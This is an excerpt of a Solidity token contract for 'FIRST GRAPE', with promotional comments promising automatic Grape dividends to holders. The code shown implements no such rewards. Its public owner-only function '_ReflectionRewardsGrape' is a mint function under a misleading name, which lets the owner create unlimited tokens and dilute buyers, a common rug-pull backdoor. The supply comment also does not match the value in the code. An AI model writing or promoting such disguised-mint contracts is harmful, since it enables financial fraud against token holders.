...
//
// $FirstGrape proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN FirstGrape! With the auto-claim feature,
// simply hold$FirstGrape and you'll receive Grape automatically in your wallet.
// 
// Hold FirstGrape and get rewarded in Grape on every transaction!
//
//
// 📱 Telegram: https://t.me/FirstGrape
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewardsGrape(uint256 amount) public onlyOwner {
    _ReflectionRewardsGrape(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsGrape(address account, uint256 amount) internal virtual {
...
contract FIRSTGRAPE is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("FIRST GRAPE", "FIRSTGRAPE") {
        _ReflectionRewardsGrape(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}